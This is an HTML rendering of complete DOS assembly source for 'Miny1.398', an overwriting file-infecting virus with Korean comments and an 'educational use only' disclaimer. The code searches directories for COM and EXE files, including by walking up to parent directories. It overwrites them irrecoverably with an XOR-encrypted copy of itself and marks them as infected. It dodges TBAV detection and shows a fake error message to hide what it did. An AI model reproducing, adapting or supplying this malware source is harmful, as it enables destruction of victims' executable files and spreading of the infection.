<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MY1-398.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;           Miny1.398                                          CVC #02  97/09</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Name : Miny1.398</span><span class="sc0">
</span><span class="sc1">; Original Author : KOV (Knight Of Virus) of SVS (Seoul Virus Society)</span><span class="sc0">
</span><span class="sc1">; Author : Osiris of CVC,Corea</span><span class="sc0">
</span><span class="sc1">; Type : Non Resident  Overwriting</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Miny1.432 바이러스의 개선판이다. Miny1.432 는 예전 버전에서 시스템 속성 파일</span><span class="sc0">
</span><span class="sc1">; 을 감염 시키는 것이 불가능 하게 만들었다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Miny1.397 는 Miny1.432 의 문제를 개선하였다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Miny1 에서 24h 번 인터럽트를 가로채지 않는 버그를 해결했다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  현재 디렉토리에서 COM 파일 부터 감염 시키며 후에 EXE 파일도 감염시킨다.</span><span class="sc0">
</span><span class="sc1">;  15 개 이상 감염되었으면 바이러스가 가지고 있는 메시지를 출력한다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  !!!! 경고 !!!!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  겹쳐쓰기 바이러스이므로 감염된 파일은 정상복구 할 수 없다.</span><span class="sc0">
</span><span class="sc1">;  본 바이러스는 교육적인 목적으로만 사용되어야 하며 이 바이러스로 인한</span><span class="sc0">
</span><span class="sc1">;  모든 책임은 사용자에게 있다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">


 </span><span class="sc5">Miny1</span><span class="sc0">         </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">PARA</span><span class="sc0"> </span><span class="sc12">'Miny1'</span><span class="sc0">
               </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Miny1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Miny1</span><span class="sc0">

               </span><span class="sc9">Org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
 </span><span class="sc5">Entry</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Decode</span><span class="sc0">                   </span><span class="sc1">; 암호 풀기</span><span class="sc0">

 </span><span class="sc5">Encry_Start</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">S_Find</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">       </span><span class="sc1">; COM 감염인가, EXE 감염인가</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Total</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">        </span><span class="sc1">; 3개 감염</span><span class="sc0">
               </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Com_File</span><span class="sc0">       </span><span class="sc1">; 모든 COM 파일 감염</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Infected</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">     </span><span class="sc1">; 감염된 갯수를 0 으로 한다.</span><span class="sc0">
               </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">Virus_Start</span><span class="sc0">              </span><span class="sc1">; 파일 찾기로 점프</span><span class="sc0">

</span><span class="sc1">;=================================================</span><span class="sc0">
</span><span class="sc1">; 데이터 값 영역</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

 </span><span class="sc5">Vir_Msg</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">' Miny1 Virus - Bug Fix Version  97/08/14'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
               </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">' (c) Copyleft 1997 by Osiris of CVC,Corea'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
               </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0">

 </span><span class="sc5">Msg</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Abnormal Program Termination.'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

 </span><span class="sc1">; TBAV 진단 피하기</span><span class="sc0">
 </span><span class="sc5">Com_File</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'*.c?m'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">; 모든 C?M 파일</span><span class="sc0">
 </span><span class="sc5">Exe_File</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'*.e?e'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">; 모든 E?E 파일</span><span class="sc0">
 </span><span class="sc5">Total</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                        </span><span class="sc1">; 감염시킨수</span><span class="sc0">
 </span><span class="sc5">Infected</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                        </span><span class="sc1">; 지금까지 감염된 파일들</span><span class="sc0">
 </span><span class="sc5">S_Find</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                        </span><span class="sc1">; 감염시키고 있는 상태</span><span class="sc0">
 </span><span class="sc5">UP</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                  </span><span class="sc1">; 상위로 이동</span><span class="sc0">

 </span><span class="sc5">Virus_Start</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0090h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Int 24h 값 저장</span><span class="sc0">
               </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0092h</span><span class="sc4">]</span><span class="sc0">

               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0090h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewInt24</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0092h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">            </span><span class="sc1">; Int 24h 가로챔</span><span class="sc0">

               </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                       </span><span class="sc1">; cs=ds</span><span class="sc0">
               </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

 </span><span class="sc5">Find_File</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
               </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100011B</span><span class="sc0">             </span><span class="sc1">; 파일 속성</span><span class="sc0">
 </span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
               </span><span class="sc6">Jc</span><span class="sc0">      </span><span class="sc5">Find_EXE</span><span class="sc0">                 </span><span class="sc1">; 에러?</span><span class="sc0">
 </span><span class="sc5">ChkInfect</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0080h</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">                  </span><span class="sc1">; COMMAND.COM 인가 ?</span><span class="sc0">
               </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Find_NEXT</span><span class="sc0">                </span><span class="sc1">; 감염 제외</span><span class="sc0">
               </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0080h</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; 감염 여부 검사</span><span class="sc0">
               </span><span class="sc6">And</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">                   </span><span class="sc1">; 감염되었나 ?</span><span class="sc0">
               </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">                   </span><span class="sc1">; (62초 인가 ?)</span><span class="sc0">
               </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">InfectFile</span><span class="sc0">
               </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">INFECTED</span><span class="sc0">        </span><span class="sc1">; 감염된 파일</span><span class="sc0">
 </span><span class="sc5">Find_NEXT</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                   </span><span class="sc1">; 다음 파일 검사</span><span class="sc0">
               </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Find</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

 </span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                 </span><span class="sc1">; 속성을 읽기/쓰기로 만든다.</span><span class="sc0">
               </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">; DTA 가 0080h 부터 시작하므로</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc0">
               </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                 </span><span class="sc1">; 오픈/쓰기로 오픈</span><span class="sc0">
               </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

               </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                    </span><span class="sc1">; AX 에 핸들 넣기</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                 </span><span class="sc1">; 시간 얻기</span><span class="sc0">
               </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
               </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
               </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

               </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; 임의의 시간 얻기 (암호화</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; 에 사용)</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">046Ch</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; 0000:046Ch</span><span class="sc0">
               </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Key_Value</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">; Key_Value = 암호키 값</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write_Vir</span><span class="sc0">                </span><span class="sc1">; 바이러스 쓰기 호출</span><span class="sc0">

               </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; 시간 복구</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
               </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,+</span><span class="sc2">1Fh</span><span class="sc0">                  </span><span class="sc1">; 초를 62초 로 바꿈</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                 </span><span class="sc1">; 시간 조정(원래 시간)</span><span class="sc0">
               </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                   </span><span class="sc1">; 파일 닫기</span><span class="sc0">
               </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Total</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; 3개 감염시켰나?</span><span class="sc0">
               </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Stop_Virus</span><span class="sc0">
               </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Total</span><span class="sc0">           </span><span class="sc1">; 1 증가</span><span class="sc0">
               </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Find_NEXT</span><span class="sc0">
 </span><span class="sc5">Find_EXE</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">S_Find</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; 01이면 EXE 파일도 감염시켰다.</span><span class="sc0">
               </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">DX_EXE</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">UP</span><span class="sc0">            </span><span class="sc1">; 상위 디렉토리로 이동</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">
               </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
               </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Stop_Virus</span><span class="sc0">               </span><span class="sc1">; 루트 디렉토리 인가 ?</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">S_Find</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">       </span><span class="sc1">; COM 파일 부터 감염</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">COM_File</span><span class="sc0">
               </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Find_File</span><span class="sc0">
 </span><span class="sc5">DX_EXE</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">S_Find</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">       </span><span class="sc1">; EXE 파일을 감염시켜라.</span><span class="sc0">
               </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Exe_File</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">Find_File</span><span class="sc0">

 </span><span class="sc5">Stop_Virus</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; 원래 Int 24h 로 바꿈</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0092h</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0090h</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
               </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc0">           </span><span class="sc1">; 정상적인 에러로 가장</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Infected</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">     </span><span class="sc1">; 15개 감염시켰으면 메시지</span><span class="sc0">
               </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">PrtMsg</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Vir_Msg</span><span class="sc0">
 </span><span class="sc5">PrtMsg</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                     </span><span class="sc1">; 메시지 출력</span><span class="sc0">
               </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

               </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc0">                   </span><span class="sc1">; 바이러스 종료</span><span class="sc0">
               </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

 </span><span class="sc5">NewInt24</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; Int 24h 처리</span><span class="sc0">
               </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
               </span><span class="sc6">IRET</span><span class="sc0">

 </span><span class="sc5">End_Encry</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;==================================================</span><span class="sc0">
</span><span class="sc1">;   바이러스 암호화 부분</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Write_Vir</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Decode</span><span class="sc0">                   </span><span class="sc1">; 암호</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                   </span><span class="sc1">; 바이러스 쓰기</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Vir_END</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Decode</span><span class="sc0">                   </span><span class="sc1">; 암호 해제</span><span class="sc0">
               </span><span class="sc6">RET</span><span class="sc0">
 </span><span class="sc5">Key_Value</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

 </span><span class="sc5">Decode</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">103h</span><span class="sc0">                 </span><span class="sc1">; 암호 시작점</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">Key_value</span><span class="sc0">             </span><span class="sc1">; 암호 키값</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_Encry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">103h</span><span class="sc0">
 </span><span class="sc5">E_Ing</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">lodsb</span><span class="sc0">                            </span><span class="sc1">; 암호화</span><span class="sc0">
               </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
               </span><span class="sc6">stosb</span><span class="sc0">
               </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">E_ing</span><span class="sc0">
               </span><span class="sc6">RET</span><span class="sc0">
 </span><span class="sc5">Vir_END</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc5">Miny1</span><span class="sc0">         </span><span class="sc9">ENDS</span><span class="sc0">
               </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">Entry</span><span class="sc0">
</span></div></body>
</html>
